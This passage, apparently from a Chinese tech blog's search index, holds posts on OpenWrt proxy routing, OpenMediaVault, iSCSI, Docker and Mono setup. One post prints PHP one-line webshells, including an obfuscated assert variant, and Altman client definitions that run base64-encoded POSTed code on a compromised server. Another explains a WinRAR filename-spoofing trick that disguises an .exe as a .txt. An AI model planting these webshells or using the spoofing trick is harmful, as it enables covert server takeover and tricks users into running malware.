05.1-x86-64-combined-ext4-s001.vmdk\u0026quot; failed (Bad address). The file system where disk \u0026quot;/vmfs /devices/deltadisks/17ad1ab5-openwrt-15.05.1-- x86-64-combined-ext4-s001.vmdk\u0026quot; resides is full. Select _Retry to attempt the operation again. Select Cancel to end the session.  解决办法：在Vmware Fusion中新建openwrt虚拟机（other/other linux 64, 256MB，虚拟机版本为11），第一次启动后，关机导出为ova，然后再导入到ESXI6中。具体原因未知。    安装软件 opkg update opkg remove dnsmasq opkg install dnsmasq-full opkg install ipset iptables-mod-nat-extra wget http://x.x.x.x/shadowsocks-libev_2.4.6-1_x86_64.ipk opkg install shadowsocks-libev_2.4.6-1_x86_64.ipk PS\n在这里，安装官方版的shadowsocks，而不是openwrt spec版, 下载地址在这里。\nPPS\n在这里，如果安装的顺序不同，可能会导致lib的依赖错误(至少在15.05.1上是这样)。使用ldd命令，检查一下shadowsocks的依赖包是否正常。\nldd /usr/bin/ss-redir 配置 配置shadowsocks 配置/etc/shadowsocks.json，格式如下：\n{ \u0026#34;server\u0026#34;: \u0026#34;X.X.X.X\u0026#34;, \u0026#34;server_port\u0026#34;: \u0026#34;443\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;local_port\u0026#34;: \u0026#34;1080\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;aes-256-cfb\u0026#34; } 修改/etc/init.d/shadowsocks，设置shadowsocks以Proxy Mode模式启动，同时开启转发DNS请求功能，上游DNS为8.8.8.8：\n#!/bin/sh /etc/rc.common  START=95 SERVICE_USE_PID=1 SERVICE_WRITE_PID=1 SERVICE_DAEMONIZE=1 CONFIG=/etc/shadowsocks.json start() { #service_start /usr/bin/ss-local -c $CONFIG -b 0.0.0.0 service_start /usr/bin/ss-redir -c $CONFIG -b 0.0.0.0 service_start /usr/bin/ss-tunnel -c $CONFIG -b 0.0.0.0 -l 5353 -L 8.8.8.8:53 -u } stop() { #service_stop /usr/bin/ss-local service_stop /usr/bin/ss-redir service_stop /usr/bin/ss-tunnel } 设置shadowsocks开机启动，并手动运行：\n/etc/init.d/shadowsocks enable /etc/init.d/shadowsocks start 到目前为止，你已经有了一个监听在1080端口的socks代理，和监听在5353端口的不受污染的DNS服务器\n配置ipset 进入Luci界面-网络-防火墙-自定义规则，加入以下规则（最后的1080是shadowsocks的本地端口，请酌情修改）：\n#创建名为gfwlist，格式为iphash的集合 ipset -N gfwlist iphash #匹配gfwlist中ip的nat流量均被转发到shadowsocks端口 iptables -t nat -A PREROUTING -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080 #匹配gfwlist中ip的本机流量均被转发到shadowsocks端口 iptables -t nat -A OUTPUT -p tcp -m set --match-set gfwlist dst -j REDIRECT --to-port 1080 配置dnsmasq-full 修改/etc/dnsmasq.conf，在文末加入conf-dir=/etc/dnsmasq.d：\necho \u0026#39;conf-dir=/etc/dnsmasq.d\u0026#39; \u0026gt;\u0026gt; /etc/dnsmasq.conf 新建目录/etc/dnsmasq.d，生成dnsmasq_list.conf 到该目录：\ngit clone https://github.com/cokebar/gfwlist2dnsmasq.git cd gfwlist2dnsmasq python2 gfwlist2dnsmasq.py mkdir /etc/dnsmasq.d cp dnsmasq_list.conf /etc/dnsmasq.d 其中，dnsmasq_list.conf的格式为：\n#使用不受污染的DNS解析该域名,可以将此IP改为自己使用的DNS服务器 server=/google.com/127.0.0.1#5353 #将解析出来的IP保存到名为gfwlist的ipset表中 ipset=/google.com/gfwlist 你可以手动修改这个文件，你也可以使用gfwlist2dnsmasq.py自动生成dnsmasq_list版的gfwlist列表。\n重新运行dnsmasq，它将监听在本机53端口上。\n/etc/init.d/dnsmasq restart 测试 场景一\n PC端的默认网关设置为192.168.0.1, DNS设置为192.168.0.1  国内网站访问正常 Google无法访问    场景二\n PC端的默认网关设置为192.168.0.254, DNS设置为192.168.0.254  访问国内网站  dnsmasq解析该域名，发现该域名不在dnsmasq_list中，使用默认DNS服务器进行解析，正常访问。   访问Google  dnsmasq解析该域名，发现该域名在dnsmasq_list中，使用设置的安全DNS服务器进行解析，并将该IP加至gfwlist集合中，iptables匹配到规则，将流量转发到shadowsocks监听的端口，进行代理访问。      参考  https://blog.sorz.org/p/openwrt-outwall/ http://aenes.com/post/740.html https://php-rmcr7.rhcloud.com/openwrt-fq/ https://cokebar.info/archives/962/comment-page-2/#comments  ","permalink":"https://www.keepwn.com/posts/route-traffic-selectively-by-domain-on-openwrt/","summary":"目标 部署一台自动代理路由器，实现根据域名来自动设定直连或者代理，而我要做的只是设置PC的默认网关为主路由器（192.168.0.1）还是自动代理路由器（192.168.0.254）。\n创建Openwrt虚拟机 系统版本\n 主路由器 (ip: 192.168.0.1) ESXI 6.0U2 Openwrt 15.05.1 (ip: 192.168.0.254，gateway: 192.168.0.1)  Openwrt虚拟机的配置教程有很多，这里只针对ESXI版Openwrt可能会遇到的问题说明下：\n  在ESXI6上，openwrt_x86每次启动时会大概率的出现卡死现象，表现为Kernel panic - not syncing: Attempted to kill init。\n 解决办法：改用openwrt_x64后正常。原因未知。    在ESXI6上，在openwrt上执行某些命令时，会被强制关机，表现为\n来自 promote 的消息: The operation on the file \u0026quot;/vmfs/devices/deltadisks/17ad1ab5-openwrt-15. 05.1-x86-64-combined-ext4-s001.vmdk\u0026quot; failed (Bad address). The file system where disk \u0026quot;/vmfs /devices/deltadisks/17ad1ab5-openwrt-15.05.1-- x86-64-combined-ext4-s001.vmdk\u0026quot; resides is full. Select _Retry to attempt the operation again. Select Cancel to end the session.","title":"Openwrt上使用dnsmasq和ipset实现域名分流"},{"content":"背景 之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个OpenMediaVault玩玩。\n安装过程不表。\n事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。\n林尽水源 在网页端对OMV进行配置时，经常会遇到一个弹窗monit: Cannot connect to the monit daemon. Did you start it with http support?。\n详细错误代码如下：\nexception 'OMVException' with message 'Failed to execute command 'export LANG=C; monit restart collectd 2\u0026gt;\u0026amp;1': monit: Cannot connect to the monit daemon. Did you start it with http support?' in /usr/share/php/openmediavault/monit.inc:113 Stack trace: #0 /usr/share/php/openmediavault/monit.inc(70): OMVMonit-\u0026gt;action('restart', 'collectd', false) #1 /usr/share/openmediavault/engined/module/collectd.inc(53): OMVMonit-\u0026gt;restart('collectd') #2 /usr/share/openmediavault/engined/rpc/config.inc(206): OMVModuleCollectd-\u0026gt;startService() #3 [internal function]: OMVRpcServiceConfig-\u0026gt;applyChanges(Array, Array) #4 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array) #5 /usr/share/php/openmediavault/rpcservice.inc(158): OMVRpcServiceAbstract-\u0026gt;callMethod('applyChanges', Array, Array) #6 /usr/share/openmediavault/engined/rpc/config.inc(224): OMVRpcServiceAbstract-\u0026gt;callMethodBg('applyChanges', Array, Array) #7 [internal function]: OMVRpcServiceConfig-\u0026gt;applyChangesBg(Array, Array) #8 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array) #9 /usr/share/php/openmediavault/rpc.inc(79): OMVRpcServiceAbstract-\u0026gt;callMethod('applyChangesBg', Array, Array) #10 /usr/sbin/omv-engined(500): OMVRpc::exec('Config', 'applyChangesBg', Array, Array, 1) #11 {main} ssh到OMV终端，输入命令：monit status，似乎错误信息也一样：\nmonit: error connecting to the monit daemon 在这种情况下，OMV就无法应用配置，必须解决这问题。\n初仿佛若有光 于是去google上找啊，找啊，终于找到一篇帖子，遇到了相似的问题（竟然不是StackOverflow，差评！)\nBecause ntpdate is installed in the image. Both ntp server and ntpdate cannot be installed at the same time. Also, the config for the ntp server does not work\u0026hellip;.\napt-get \u0026ndash;purge remove ntpdate\nThen in the OMV web gui set your timezone because after these changes you cannot set it again.\nthen edit /etc/ntp.conf:\nremove these lines:\nserver 127.127.1.0 # Local clock\nfudge 127.127.1.0 stratum 12\nserver pool.ntp.org iburst\nAnd replace with these:\nserver 0.no.pool.ntp.org iburst\nserver 1.no.pool.ntp.org iburst\nserver 2.no.pool.ntp.org iburst\nserver 3.no.pool.ntp.org iburst\nThen you can:\nservice ntp restart\nDo not disable/enable in the OMV web gui again. The mkconf file for the ntp service will overwrite thesechanges. There need to be some updates so it works properly with the rpi 2.\nYour logs files and dates at boot will be all messed up with wrong dates until you install a RTC module. After boot it takes some minutes before the ntp server will update the time/date. With a RTC module everything is perfect at boot.\n  总结几点就是：\n Monit的错误和系统时间有关  （检查了一下，确实系统当前时间错误）   ntpdate与ntp server有冲突，不能同时安装  （检查了一下，ntp服务启动失败）   OMV自带的ntp配置/etc/ntp.conf有错误 你应该安装RTC模块  复行数十步 按照前面这位贤者的建议，我分别进行了一下几个测试：\n 测试一: 手动修改当前时间，卸载ntpdate，关闭ntp服务  重启以后，时间丢失   测试二: 卸载ntpdate，不修改ntp配置文件  ntp服务正常启动，时间同步正确 重启以后，ntp服务正常启动，时间无法同步   测试三: 卸载ntpdate，修改ntp配置文件  ntp服务正常启动，时间同步正确 重启以后，ntp服务正常启动，时间无法同步   测试四: 运行ntpdate，强制同步  时间同步正确 重启以后，ntp服务不能正常启动，时间无法同步    测试后发现，因为树莓派本身的硬件限制，系统重启后会丢失当前时间。\n尽管开启了ntp服务，但是如果系统当前时间与真实时间跨度太大，则不会进行同步。\n所以只能放弃ntp server，转而使用ntpdate来强制同步时间，并设置开机启动。\n代码如下：\n# 设置开机同步时间，注意: 添加的代码必须在`exit 0`之前 echo '/usr/sbin/ntpdate 0.cn.pool.ntp.org' \u0026gt;\u0026gt; /etc/rc.local # 设置同步任务，每隔5分钟同步一次时间 # 编辑crontab，并保存 crontab -e */5 * * * * /usr/sbin/ntpdate 0.cn.pool.ntp.org 重启系统，系统时间已经正确了。\n在网页端对OMV重新进行配置。WTF，怎么还是monit这个问题！\n豁然开朗 登入终端，重新进行检查：\nroot@raspberrypi:~# date Dec 16 11:12:04 CST 2015 root@raspberrypi:~# monit status monit: error connecting to the monit daemon 到这里时，我当时确实很疑惑，明明系统时间已经正确了，为什么monit还是报错呢。\n突然灵光乍现，重新启动monit服务，然后十几秒过后：\nroot@raspberrypi:~# monit status The Monit daemon 5.4 uptime: 18m System 'localhost' status Running monitoring status Monitored load average [0.00] [0.01] [0.05] cpu 0.0%us 0.1%sy 0.0%wa memory usage 55424 kB [5.5%] swap usage 0 kB [0.0%] data collected 16 Dec 2015 11:12:17 ... Process 'collectd' status Running monitoring status Monitored pid 2535 parent pid 1 uptime 18m children 0 memory kilobytes 4224 memory kilobytes total 4224 memory percent 0.4% memory percent total 0.4% cpu percent 0.0% cpu percent total 0.0% data collected 16 Dec 2015 11:12:17 在此个人分析，在monit服务启动时，系统时间还未同步，所以monit初始化失败。只要保证在时间同步后，再重启monit服务应该就可以了。\n# 在强制同步时间后，再重启monit服务 echo '/etc/init.d/monit restart' \u0026gt;\u0026gt; /etc/rc.local 重启系统，一切正常。END！\n参考  http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/ http://forums.openmediavault.org/index.php/Thread/8770-RPi-2-RTC-module-from-unruly-Stepchild-to-Wunderkind/ https://www.raspberrypi.org/forums/viewtopic.php?f=91\u0026amp;t=83344  ","permalink":"https://www.keepwn.com/posts/error-connecting-to-the-monit-daemon-in-omv-for-pi2/","summary":"背景 之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个OpenMediaVault玩玩。\n安装过程不表。\n事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。\n林尽水源 在网页端对OMV进行配置时，经常会遇到一个弹窗monit: Cannot connect to the monit daemon. Did you start it with http support?。\n详细错误代码如下：\nexception 'OMVException' with message 'Failed to execute command 'export LANG=C; monit restart collectd 2\u0026gt;\u0026amp;1': monit: Cannot connect to the monit daemon. Did you start it with http support?' in /usr/share/php/openmediavault/monit.inc:113 Stack trace: #0 /usr/share/php/openmediavault/monit.inc(70): OMVMonit-\u0026gt;action('restart', 'collectd', false) #1 /usr/share/openmediavault/engined/module/collectd.inc(53): OMVMonit-\u0026gt;restart('collectd') #2 /usr/share/openmediavault/engined/rpc/config.inc(206): OMVModuleCollectd-\u0026gt;startService() #3 [internal function]: OMVRpcServiceConfig-\u0026gt;applyChanges(Array, Array) #4 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array) #5 /usr/share/php/openmediavault/rpcservice.","title":"Pi2版OMV的Monit连接错误的问题"},{"content":"因为有业务需求，需要在docker的容器下连接iscsi磁盘。\n 部署docker镜像，安装open-iscsi： test@testpc$ docker pull ubuntu:14.04 test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi  进入容器，运行iscsiadm： root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10 iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: Cann perform discovery. connect to iSCSI daemon (111)!   初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。\n有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数privileged:\ntest@testpc$ docker help run ... --privileged=false Give extended privileges to this container ... docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。\n尝试一下：\n 使用privileged创建一个新的容器： test@testpc$ docker run --privileged --name test -t -i ubuntu:14.04 /bin/bash  进入容器，运行iscsiadm： root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10 192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1   完美解决！END\n","permalink":"https://www.keepwn.com/posts/using-open-iscsi-in-docker-container/","summary":"因为有业务需求，需要在docker的容器下连接iscsi磁盘。\n 部署docker镜像，安装open-iscsi： test@testpc$ docker pull ubuntu:14.04 test@testpc$ docker run ubuntu:14.04 apt-get install -y open-iscsi  进入容器，运行iscsiadm： root@aaaa# iscsiadm -m discovery -t st -p 192.168.1.10 iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: can not connect to iSCSI daemon (111)! iscsiadm: Cann perform discovery. connect to iSCSI daemon (111)!   初步排查原因，可能是因为找不到iscsi的驱动。该装装，该删删，结果依旧不行。\n有没有可能是docker本身的默认配置或策略问题？想到这，果然在某个docker官方文档中找到了一个参数privileged:\ntest@testpc$ docker help run ... --privileged=false Give extended privileges to this container ... docker容器内的root，默认情况下只是外部的一个普通用户权限，并不拥有root权限。只有使用了该参数，容器内的root才拥有真正的root权限。\n尝试一下：\n 使用privileged创建一个新的容器： test@testpc$ docker run --privileged --name test -t -i ubuntu:14.","title":"Docker环境下使用open-iscsi遇到的问题"},{"content":"总体步骤  安装iscsi 查找iscsi存储 设置开机自动映射 对映射的磁盘进行分区 分区之后进行格式化 设置开机自动加载分区  配置过程 安装程序open-iscsi test@ubuntu:~$ apt-get install open-iscsi test@ubuntu:~$ service open-iscsi status 查找iscsi存储 test@ubuntu:~$ iscsiadm -m discovery -t sendtargets -p 192.168.1.10 192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1 设置开机自动映射 test@ubuntu:~$ iscsiadm -m node -T iqn.1997-05.com.test:iscsi1 -p 192.168.1.10:3260 --op update -n node.startup -v automatic 重新启动，检查是否成功映射 test@ubuntu:~$ reboot test@ubuntu:~$ cat /proc/partitions 发现多出了一块设备/dev/sdb\n对映射的磁盘进行分区 如果小于2T分区，可以使用fdisk进行分区，使用MBR分区表，\n如果大于2T分区，则不能使用MBR分区表，需要使用GPT分区表。\ntest@ubuntu:~$ parted /dev/sdb \u0026gt; print \u0026gt; mklabel gpt \u0026gt; mkpart primary 0% 100% \u0026gt; print 分区之后进行格式化，格式化时硬盘分区太大，可以使用-T largefile参数 test@ubuntu:~$ mkfs.ext4 -T largefile /dev/sdb1 设置开机自动加载分区 test@ubuntu:~$ e2label /dev/sdb1 /iscsi test@ubuntu:~$ echo \u0026quot;LABEL=/iscsi /data ext4 _netdev 0 0\u0026quot; \u0026gt;\u0026gt; /etc/fstab PS: _netdev指的是，这个分区位于网络上，所以得等待网络启动完成后才会挂载该设备\nDone。 这样重启系统就可以自动挂载分区，使用跟本地磁盘一样。\n","permalink":"https://www.keepwn.com/posts/howto-connect-iscsi-on-ubuntu/","summary":"总体步骤  安装iscsi 查找iscsi存储 设置开机自动映射 对映射的磁盘进行分区 分区之后进行格式化 设置开机自动加载分区  配置过程 安装程序open-iscsi test@ubuntu:~$ apt-get install open-iscsi test@ubuntu:~$ service open-iscsi status 查找iscsi存储 test@ubuntu:~$ iscsiadm -m discovery -t sendtargets -p 192.168.1.10 192.168.1.10:3260,1 iqn.1997-05.com.test:iscsi1 设置开机自动映射 test@ubuntu:~$ iscsiadm -m node -T iqn.1997-05.com.test:iscsi1 -p 192.168.1.10:3260 --op update -n node.startup -v automatic 重新启动，检查是否成功映射 test@ubuntu:~$ reboot test@ubuntu:~$ cat /proc/partitions 发现多出了一块设备/dev/sdb\n对映射的磁盘进行分区 如果小于2T分区，可以使用fdisk进行分区，使用MBR分区表，\n如果大于2T分区，则不能使用MBR分区表，需要使用GPT分区表。\ntest@ubuntu:~$ parted /dev/sdb \u0026gt; print \u0026gt; mklabel gpt \u0026gt; mkpart primary 0% 100% \u0026gt; print 分区之后进行格式化，格式化时硬盘分区太大，可以使用-T largefile参数 test@ubuntu:~$ mkfs.","title":"Ubuntu14.04下连接ISCSI存储"},{"content":"一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。\n而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。\n今天早些时候，在stackoverflow看到之前有人提到过类似的问题，恍然大悟。\n原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在这里有详细的说明)\n所以，解决这个问题目前有三种方法：\n 手动修改Plugins目录下插件的文件属性。 在程序根目录下添加Altman.exe.config，内容如下: \u0026lt;configuration\u0026gt;\r\u0026lt;runtime\u0026gt;\r\u0026lt;loadFromRemoteSources enabled=\u0026quot;true\u0026quot;/\u0026gt;\r\u0026lt;/runtime\u0026gt;\r\u0026lt;/configuration\u0026gt;\r 主程序将在下一个版本2.2.1中解决该问题。  ","permalink":"https://www.keepwn.com/posts/run-app-based-on-mef-from-web/","summary":"一直有小伙伴给我反馈说：在.Net环境安装好的情况下，Altman不能自动载入插件。\n而我在测试的时候，确实发生过相似的现象，但却找不到问题所在。\n今天早些时候，在stackoverflow看到之前有人提到过类似的问题，恍然大悟。\n原来，当我们从Web下载Altman程序的时候，程序集将会被添加一个新的安全属性（文件来自网络，已被锁定）。运行altman，由于loadFromRemoteSources默认属性是false，程序就无法加载这些插件dll。(在这里有详细的说明)\n所以，解决这个问题目前有三种方法：\n 手动修改Plugins目录下插件的文件属性。 在程序根目录下添加Altman.exe.config，内容如下: \u0026lt;configuration\u0026gt;\r\u0026lt;runtime\u0026gt;\r\u0026lt;loadFromRemoteSources enabled=\u0026quot;true\u0026quot;/\u0026gt;\r\u0026lt;/runtime\u0026gt;\r\u0026lt;/configuration\u0026gt;\r 主程序将在下一个版本2.2.1中解决该问题。  ","title":"Altman不能成功的加载插件"},{"content":"##0x00准备工作\n一个全新安装的MacOs X10.9系统\n##0×01下载Mono和MonoDevelop并安装\n MonoFramework-MDK-3.4.0.macos10.xamarin.x86.pkg [XamarinStudio-5.0.1.3-0.dmg] 1  然后默认安装即可。\n##0×02验证Mono是否安装正确\nTestAdeMac:~ testa$ mono -V\rMono JIT compiler version 3.4.0 ((no/d4511ef Tue Mar 25 14:35:52 EDT 2014)\rCopyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com\rTLS: normal\rSIGSEGV: altstack\rNotification: kqueue\rArchitecture: x86\rDisabled: none\rMisc: softdebug LLVM: yes(3.4svn-mono-(no/e656cac)\rGC: sgen\r安装成功。\n","permalink":"https://www.keepwn.com/posts/osx-installed-mono-environment/","summary":"##0x00准备工作\n一个全新安装的MacOs X10.9系统\n##0×01下载Mono和MonoDevelop并安装\n MonoFramework-MDK-3.4.0.macos10.xamarin.x86.pkg [XamarinStudio-5.0.1.3-0.dmg] 1  然后默认安装即可。\n##0×02验证Mono是否安装正确\nTestAdeMac:~ testa$ mono -V\rMono JIT compiler version 3.4.0 ((no/d4511ef Tue Mar 25 14:35:52 EDT 2014)\rCopyright (C) 2002-2014 Novell, Inc, Xamarin Inc and Contributors. www.mono-project.com\rTLS: normal\rSIGSEGV: altstack\rNotification: kqueue\rArchitecture: x86\rDisabled: none\rMisc: softdebug LLVM: yes(3.4svn-mono-(no/e656cac)\rGC: sgen\r安装成功。","title":"Mac安装mono环境"},{"content":"之前测试altman工具的时候，遇到了一个问题，现解决方法如下：\nAltman连接phpEval一句话木马的时候，phpEval.type的定义如下：\n\u0026lt;customShellType\u0026gt;\r\u0026lt;basicSetting\u0026gt;\r\u0026lt;name\u0026gt;phpEval\u0026lt;/name\u0026gt;\r\u0026lt;serviceExample\u0026gt;\u0026lt;![CDATA[\u0026lt;?php @eval($_POST[a])?\u0026gt;]]\u0026gt;\u0026lt;/serviceExample\u0026gt;\r\u0026lt;mainCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;None\u0026quot; \u0026gt;passwd\u0026lt;/mainCodeParam\u0026gt;\r\u0026lt;/basicSetting\u0026gt;\r\u0026lt;mainCodeSetting\u0026gt;\r\u0026lt;funcCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;Base64\u0026quot; \u0026gt;funcCode\u0026lt;/funcCodeParam\u0026gt;\r\u0026lt;item\u0026gt;\u0026lt;![CDATA[print(\u0026quot;-\u0026gt;|\u0026quot;);\reval(base64_decode($_POST[$funcCode$]));\rprint(\u0026quot;|\u0026lt;-\u0026quot;);\rdie();]]\u0026gt;\u0026lt;/item\u0026gt;\r\u0026lt;/mainCodeSetting\u0026gt;\r\u0026lt;/customShellType\u0026gt;\reval函数执行php语句\nprint(\u0026quot;-\u0026gt;|\u0026quot;);eval(base64_decode($_POST[$funcCode$]));print(\u0026quot;|\u0026lt;-\u0026quot;);die();时，\n确实是正确的。\n然而当使用某些变形php一句话木马，如：\n\u0026lt;?php $a = \u0026quot;a\u0026quot;.\u0026quot;s\u0026quot;.\u0026quot;s\u0026quot;.\u0026quot;e\u0026quot;.\u0026quot;r\u0026quot;.\u0026quot;t\u0026quot;; $a($_POST[\u0026quot;a\u0026quot;]); ?\u0026gt;\n时，\nAltman就无法连接一句话木马了。\n原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(\u0026quot;-\u0026gt;|\u0026quot;)代码，后面的代码则直接报错了。\n所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：\n\u0026lt;customShellType\u0026gt;\r\u0026lt;basicSetting\u0026gt;\r\u0026lt;name\u0026gt;phpAssert\u0026lt;/name\u0026gt;\r\u0026lt;serviceExample\u0026gt;\u0026lt;![CDATA[\u0026lt;?php @assert($_POST[a])?\u0026gt;]]\u0026gt;\u0026lt;/serviceExample\u0026gt;\r\u0026lt;mainCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;None\u0026quot; \u0026gt;passwd\u0026lt;/mainCodeParam\u0026gt;\r\u0026lt;/basicSetting\u0026gt;\r\u0026lt;mainCodeSetting\u0026gt;\r\u0026lt;funcCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;Base64\u0026quot; \u0026gt;funcCode\u0026lt;/funcCodeParam\u0026gt;\r\u0026lt;item\u0026gt;\u0026lt;![CDATA[@eval(\u0026quot;print('-\u0026gt;|');\u0026quot;.base64_decode($_POST[$funcCode$]).\u0026quot;print('|\u0026lt;-');\u0026quot;);]]\u0026gt;\u0026lt;/item\u0026gt;\r\u0026lt;/mainCodeSetting\u0026gt;\r\u0026lt;/customShellType\u0026gt;\rPS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。\n","permalink":"https://www.keepwn.com/posts/altman-connects-phpeval-and-phpassert-shell/","summary":"之前测试altman工具的时候，遇到了一个问题，现解决方法如下：\nAltman连接phpEval一句话木马的时候，phpEval.type的定义如下：\n\u0026lt;customShellType\u0026gt;\r\u0026lt;basicSetting\u0026gt;\r\u0026lt;name\u0026gt;phpEval\u0026lt;/name\u0026gt;\r\u0026lt;serviceExample\u0026gt;\u0026lt;![CDATA[\u0026lt;?php @eval($_POST[a])?\u0026gt;]]\u0026gt;\u0026lt;/serviceExample\u0026gt;\r\u0026lt;mainCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;None\u0026quot; \u0026gt;passwd\u0026lt;/mainCodeParam\u0026gt;\r\u0026lt;/basicSetting\u0026gt;\r\u0026lt;mainCodeSetting\u0026gt;\r\u0026lt;funcCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;Base64\u0026quot; \u0026gt;funcCode\u0026lt;/funcCodeParam\u0026gt;\r\u0026lt;item\u0026gt;\u0026lt;![CDATA[print(\u0026quot;-\u0026gt;|\u0026quot;);\reval(base64_decode($_POST[$funcCode$]));\rprint(\u0026quot;|\u0026lt;-\u0026quot;);\rdie();]]\u0026gt;\u0026lt;/item\u0026gt;\r\u0026lt;/mainCodeSetting\u0026gt;\r\u0026lt;/customShellType\u0026gt;\reval函数执行php语句\nprint(\u0026quot;-\u0026gt;|\u0026quot;);eval(base64_decode($_POST[$funcCode$]));print(\u0026quot;|\u0026lt;-\u0026quot;);die();时，\n确实是正确的。\n然而当使用某些变形php一句话木马，如：\n\u0026lt;?php $a = \u0026quot;a\u0026quot;.\u0026quot;s\u0026quot;.\u0026quot;s\u0026quot;.\u0026quot;e\u0026quot;.\u0026quot;r\u0026quot;.\u0026quot;t\u0026quot;; $a($_POST[\u0026quot;a\u0026quot;]); ?\u0026gt;\n时，\nAltman就无法连接一句话木马了。\n原因在于，这个变形木马使用的是assert函数，而eval与assert最主要区别是eval的参数可以是多个语句，而assert的参数是一个表达式。所以assert只会执行到print(\u0026quot;-\u0026gt;|\u0026quot;)代码，后面的代码则直接报错了。\n所以在了解到eval与assert的区别后，很容易写出一个新脚本类型，phpAssert.type定义如下：\n\u0026lt;customShellType\u0026gt;\r\u0026lt;basicSetting\u0026gt;\r\u0026lt;name\u0026gt;phpAssert\u0026lt;/name\u0026gt;\r\u0026lt;serviceExample\u0026gt;\u0026lt;![CDATA[\u0026lt;?php @assert($_POST[a])?\u0026gt;]]\u0026gt;\u0026lt;/serviceExample\u0026gt;\r\u0026lt;mainCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;None\u0026quot; \u0026gt;passwd\u0026lt;/mainCodeParam\u0026gt;\r\u0026lt;/basicSetting\u0026gt;\r\u0026lt;mainCodeSetting\u0026gt;\r\u0026lt;funcCodeParam location=\u0026quot;Body\u0026quot; encrymode=\u0026quot;Base64\u0026quot; \u0026gt;funcCode\u0026lt;/funcCodeParam\u0026gt;\r\u0026lt;item\u0026gt;\u0026lt;![CDATA[@eval(\u0026quot;print('-\u0026gt;|');\u0026quot;.base64_decode($_POST[$funcCode$]).\u0026quot;print('|\u0026lt;-');\u0026quot;);]]\u0026gt;\u0026lt;/item\u0026gt;\r\u0026lt;/mainCodeSetting\u0026gt;\r\u0026lt;/customShellType\u0026gt;\rPS:其实assert还有一个坑，那就是echo在assert中是不能直接使用的，因为在php中echo并不是一个函数:)，不能作为表达式。","title":"Altman连接phpEval与phpAssert一句话木马"},{"content":"0×00 背景 这几天仔细研究了winrar4.x系列的文件扩展名欺骗漏洞的那篇文章，通过一些测试对其有了一些新的想法和建议。（准确的说应该不能算文件扩展名欺骗漏，不止扩展名，整个文件名都是可以欺骗的）\n具体的漏洞成因相信文章中都很清楚了，简单说一下：\nzip格式中有2个filename，一般情况下，一般应用程序打开zip时，预览使用的是filename2，点击预览也是以filename2方式打开的，只有在解压的时候才会使用filename1。然而在winrar4.x中，点击预览是以预览filename1方式打开的。\n这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。\n文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。\n0×01 细节 在研究这个问题以前，先科普一下zip格式（想看详细版的去网上下载APPNOTE.TXT）。\nzip格式由3部分组成：\n1. 文件内容源数据\r2. 目录源数据\r3. 目录结束标识结构\r 以只压缩了一个文件的zip文件为例，大致格式为：\n[file header]\r[file data]\r[data descriptor]\r[central directory file header]\r[end of central directory record]\r 其中关键的几个字段为：\n[file header]:\rOffset Bytes Description\r18 4 Compressed size\r26 2 File name length (n)\r28 2 Extra field length (m)\r30 n File name\r30+n m Extra field\r[central directory file header]:\rOffset Bytes Description\r28 2 File name length (n)\r30 2 Extra field length (m)\r34 2 File comment length (k)\r[end of central directory record]:\rOffset Bytes Description\r12 4 Size of central directory (bytes)\r16 4 Offset of start of central directory, relative to start of archive\r 在了解了zip基本格式后，我对winrar压缩生成的zip文件和用windows生成的zip文件进行了分析，它们的区别是winrar的zip文件在Extra field区段都进行了一些数据填充。\n由于不清楚Extra field这部分的值会不会影响到winrar的校验，所以根据不同情况做了几个测试，当filename2长度改变时，并且对受filename2长度影响的所有字段（除Extra field）进行修改后，文件可以正常打开。测试结果证明Extra 